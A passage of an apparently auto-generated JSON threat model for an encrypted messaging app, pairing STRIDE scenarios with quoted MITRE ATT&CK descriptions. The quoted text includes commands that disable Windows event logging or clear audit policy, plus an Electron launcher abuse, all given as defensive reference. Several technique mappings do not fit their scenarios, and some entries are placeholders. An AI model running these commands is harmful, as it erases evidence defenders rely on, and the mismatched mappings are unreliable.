                "certificate forgery",
                "man-in-the-middle",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker clones a legitimate companion device (desktop client) to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to a legitimate desktop client.",
                    "Role": "Attacker",
                    "Condition": "The attacker can physically interact with the device."
                },
                {
                    "Assumption": "The primary device does not detect the cloned desktop client.",
                    "Role": "Primary Device",
                    "Condition": "The primary device has inadequate detection mechanisms for cloned clients."
                },
                {
                    "Assumption": "The desktop client's identity key is not adequately protected.",
                    "Role": "Desktop Client",
                    "Condition": "The desktop client does not encrypt its identity key strongly enough."
                }
            ],
            "Potential Impact": "Unauthorized access to messages and accounts",
            "MITRE ATT&CK Keywords": [
                "device cloning",
                "identity theft",
                "unauthorized access",
                "desktop"
            ],
            "mitre_technique": {
                "name": "Electron Applications",
                "description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).(Citation: Electron 6-8)\n\nAdversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)",
                "id": "attack-pattern--561ae9aa-c28a-4144-9eec-e7027a14c8c3",
                "technique_id": "T1218.015"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the SQLite database on a companion device to inject malicious data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the desktop client.",
                    "Role": "Attacker",
                    "Condition": "The attacker can either physically touch the device or gain access via a software vulnerability."
                },
                {
                    "Assumption": "The SQLite database does not have adequate encryption or integrity checks.",
                    "Role": "Database",
                    "Condition": "The SQLite database is not protected by strong encryption or hashing mechanisms."
                },
                {
                    "Assumption": "The companion device can synchronize with the primary device without thorough validation.",
                    "Role": "Companion Device",
                    "Condition": "The synchronization process does not fully verify the integrity of the data being shared."
                }
            ],
            "Potential Impact": "Corruption of data and unauthorized commands",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "data injection",
                "local access",
                "desktop"
            ],
            "mitre_technique": {
                "name": "Electron Applications",
                "description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).(Citation: Electron 6-8)\n\nAdversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)",
                "id": "attack-pattern--561ae9aa-c28a-4144-9eec-e7027a14c8c3",
                "technique_id": "T1218.015"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker sends a manipulated update for the messaging application's encryption protocol.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the software update distribution mechanism.",
                    "Role": "Attacker",
                    "Condition": "The attacker has infiltrated the distribution channel or compromised the update server."
                },
                {
                    "Assumption": "The update mechanism does not have strong integrity checks.",
                    "Role": "Update Mechanism",
                    "Condition": "The updates are not signed or verified properly before being applied."
                },
                {
                    "Assumption": "Users apply updates without verifying their authenticity.",
                    "Role": "User",
                    "Condition": "Users automatically accept updates without checking the source."
                }
            ],
            "Potential Impact": "Vulnerability of the encryption protocol to future attacks",
            "MITRE ATT&CK Keywords": [
                "update manipulation",
                "encryption protocol",
                "compromise",
                "software"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies message contents during transit by intercepting unencrypted data paths.",
            "Assumptions": [
                {
                    "Assumption": "There exists an unencrypted data path in the communication chain.",
                    "Role": "Application",
                    "Condition": "Not all parts of the communication chain are encrypted."
                },
                {
                    "Assumption": "The attacker can intercept communications between client and server.",
                    "Role": "Attacker",
                    "Condition": "The attacker can position themselves between the communicating entities."
                },
                {
                    "Assumption": "Neither the sender nor the recipient verifies message integrity.",
                    "Role": "User",
                    "Condition": "Users do not employ methods to check message hashes or digital signatures."
                }
            ],
            "Potential Impact": "Unauthorized message alteration and potential misinformation",
            "MITRE ATT&CK Keywords": [
                "message interception",
                "data path",
                "encryption",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny sending or receiving messages.",
            "Assumptions": [
                {
                    "Assumption": "There are no logs or proof of transaction.",
                    "Role": "Messaging Application",
                    "Condition": "The application does not keep robust, tamper-resistant logs of messaging activities."
                },
                {
                    "Assumption": "The cryptographic protocols do not support non-repudiation.",
                    "Role": "Cryptographic Protocol",
                    "Condition": "The protocol used does not provide mechanisms for unchangeable proof of message origination or receipt."
                },
                {
                    "Assumption": "Disputes arise around the authenticity of communications.",
                    "Role": "User",
                    "Condition": "Users are involved in sensitive or legally binding communications without proper non-repudiation measures."
                }
            ],
            "Potential Impact": "Disputes and lack of accountability in communications",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "dispute",
                "audit"
            ],
            "mitre_technique": {
                "name": "Private Keys",
                "description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",
                "id": "attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe",
                "technique_id": "T1145"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions within the application and denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "The application does not have detailed access logs.",
                    "Role": "Application",
                    "Condition": "The application lacks detailed logging mechanisms that can track user actions reliably."
                },
                {
                    "Assumption": "Multiple users share devices without unique identifiers.",
                    "Role": "User",
                    "Condition": "Devices are shared among users, and it is not possible to uniquely identify the actor for each action."
                },
                {
                    "Assumption": "The system does not enforce strong user authentication.",
                    "Role": "System",
                    "Condition": "User identity verification is weak or non-existent."
                }
            ],
            "Potential Impact": "Ambiguous responsibility for unauthorized actions",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action denial",
                "logging",
                "shared device"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker alters system logs to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to system logs.",
                    "Role": "Attacker",
                    "Condition": "The attacker has gained access to the system and can read/write log files."
                },
                {
                    "Assumption": "Logs are stored in a non-tamper-resistant manner.",
                    "Role": "System",
                    "Condition": "Logs are not stored in append-only, tamper-resistant logs such as write-once-read-many storage."
                },
                {
                    "Assumption": "There is no real-time monitoring of log integrity.",
                    "Role": "Application",
                    "Condition": "There are no systems in place to ensure the logs' integrity in real-time."
                }
            ],
            "Potential Impact": "Loss of forensic evidence and accountability",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "evidence destruction",
                "audit",
                "system"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An adversary monitors unencrypted backups from the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The backup process includes unencrypted data.",
                    "Role": "Backup Process",
                    "Condition": "Backups are not encrypted before being stored."
                },
                {
                    "Assumption": "The adversary has access to the backup storage location.",
                    "Role": "Adversary",
                    "Condition": "The adversary can access the location where backups are stored, either physically or through network access."
                },
                {
                    "Assumption": "Regular audits of backup data security are not performed.",
                    "Role": "System",
                    "Condition": "Backup systems are not subject to regular security audits and reviews."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive communications",
            "MITRE ATT&CK Keywords": [
                "backup access",
                "data exposure",
                "unencrypted backup",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a zero-day vulnerability in the encryption protocol to decrypt messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is aware of an unpatched vulnerability in the protocol.",
                    "Role": "Attacker",
                    "Condition": "The attacker has knowledge of and can exploit a zero-day vulnerability in the encryption protocol."
                },
                {
                    "Assumption": "The system has not been updated to address the vulnerability.",
                    "Role": "System",
                    "Condition": "Security patches have not been applied to mitigate the vulnerability in the encryption protocol."
                },
                {
                    "Assumption": "The vulnerability allows for the decryption of intercepted messages.",
                    "Role": "Vulnerability",
                    "Condition": "The nature of the vulnerability enables the attacker to decrypt messages."
                }
            ],
            "Potential Impact": "Compromise of message confidentiality",
            "MITRE ATT&CK Keywords": [
                "zero-day exploit",
                "encryption bypass",
                "protocol vulnerability",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised user devices leak sensitive metadata despite end-to-end encryption.",
            "Assumptions": [
                {
                    "Assumption": "User devices are compromised by malware.",
                    "Role": "User Device",
                    "Condition": "The user devices are infected with malware that can capture metadata."
                },
                {
                    "Assumption": "Sensitive metadata is not encrypted and can be captured.",
                    "Role": "Application",
                    "Condition": "Metadata, such as the time and recipient of messages, is not encrypted."
                },
                {
                    "Assumption": "Malware can communicate data back to the attacker.",
                    "Role": "Malware",
                    "Condition": "Malware can exfiltrate captured metadata to the attacker."
                }
            ],
            "Potential Impact": "Exposure of communication patterns and relationships",
            "MITRE ATT&CK Keywords": [
                "metadata leak",
                "malware",
                "device compromise",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker performs a distributed denial-of-service (DDoS) attack on the messaging application\u2019s servers.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can leverage multiple compromised systems.",
                    "Role": "Attacker",
                    "Condition": "The attacker has control over a botnet or a sufficient number of systems to perform a DDoS."
                },
                {
                    "Assumption": "The application's servers are not adequately protected against high traffic volume.",
                    "Role": "Application Server",
                    "Condition": "Servers lack DDoS mitigation mechanisms like rate limiting and load balancing."
                },
                {
                    "Assumption": "The servers are internet-facing and accessible.",
                    "Role": "Server",
                    "Condition": "Servers are publicly accessible over the internet."
                }
            ],
            "Potential Impact": "Disruption of user access and server availability",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "server overload",
                "availability disruption",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed messages that crash the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The application does not thoroughly validate message formats.",
                    "Role": "Application",
                    "Condition": "Input validation is inadequately implemented within the application."
                },
                {
                    "Assumption": "Users receive and process messages without prior validation.",
                    "Role": "User",
                    "Condition": "User devices display or process messages immediately upon receipt."
                },
                {
                    "Assumption": "Detection and mitigation for malformed message attacks are not in place.",
                    "Role": "Application",
                    "Condition": "The application lacks mechanisms to detect or neutralize malformed messages."
                }
            ],
            "Potential Impact": "Application crashes and loss of service",
            "MITRE ATT&CK Keywords": [
                "malformed message",
                "application crash",
                "service disruption",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a resource exhaustion vulnerability within the messaging server.",
            "Assumptions": [
                {
                    "Assumption": "There is an unpatched resource exhaustion vulnerability on the server.",
                    "Role": "Server",
                    "Condition": "The server has not been updated to address the vulnerability."
                },
                {
                    "Assumption": "The attacker has identified the vulnerability and knows how to exploit it.",
                    "Role": "Attacker",
                    "Condition": "The attacker can exploit the vulnerability to consume server resources."
                },
                {
                    "Assumption": "Monitoring and mitigation systems do not detect abnormal resource usage.",
                    "Role": "System",
                    "Condition": "Resource usage is not closely monitored, or alerts are insufficient."
                }
            ],
            "Potential Impact": "Server crash and unavailability",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "server crash",
                "availability disruption",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability in the operating system of a user\u2019s mobile device.",
            "Assumptions": [
                {
                    "Assumption": "The operating system has an unpatched privilege escalation vulnerability.",
                    "Role": "Operating System",
                    "Condition": "The device is running an OS version with known privilege escalation vulnerabilities."
                },
                {
                    "Assumption": "The attacker has access to the exploit code.",
                    "Role": "Attacker",
                    "Condition": "The exploit code is available publicly or obtained by the attacker."
                },
                {
                    "Assumption": "No active protections against privilege escalation are in place.",
                    "Role": "User Device",
                    "Condition": "The device does not have security software that can prevent such attacks."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system capabilities",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "exploit",
                "mobile device",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to convince a user to install a malicious application posing as a legitimate companion application.",
            "Assumptions": [
                {
                    "Assumption": "The user can be deceived through social engineering techniques.",
                    "Role": "User",
                    "Condition": "The user does not recognize or ignore the signs of a phishing or social engineering attempt."
                },
                {
                    "Assumption": "The device\u2019s security settings allow for the installation of applications from untrusted sources.",
                    "Role": "User Device",
                    "Condition": "The device is configured to install apps from sources other than the official app store."
                },
                {
                    "Assumption": "The malicious application mimics the legitimate application's functionality convincingly.",
                    "Role": "Malicious Application",
                    "Condition": "The malicious app has a user interface and behavior similar to the legitimate app."
                }
            ],
            "Potential Impact": "Execution of arbitrary commands with elevated privileges",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "malicious app",
                "unsanctioned install",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software flaw in the messaging application to gain administrative rights.",
            "Assumptions": [
                {
                    "Assumption": "There is a software flaw that allows for privilege escalation.",
                    "Role": "Messaging Application",
                    "Condition": "The application has a vulnerability that is exploitable for privilege escalation."
                },
                {
                    "Assumption": "The attacker knows about and can exploit the flaw.",
                    "Role": "Attacker",
                    "Condition": "The attacker has knowledge of the vulnerability and necessary skills to exploit it."
                },
                {
                    "Assumption": "Mitigations such as code reviews and security updates are not effective or are missing.",
                    "Role": "Development Team",
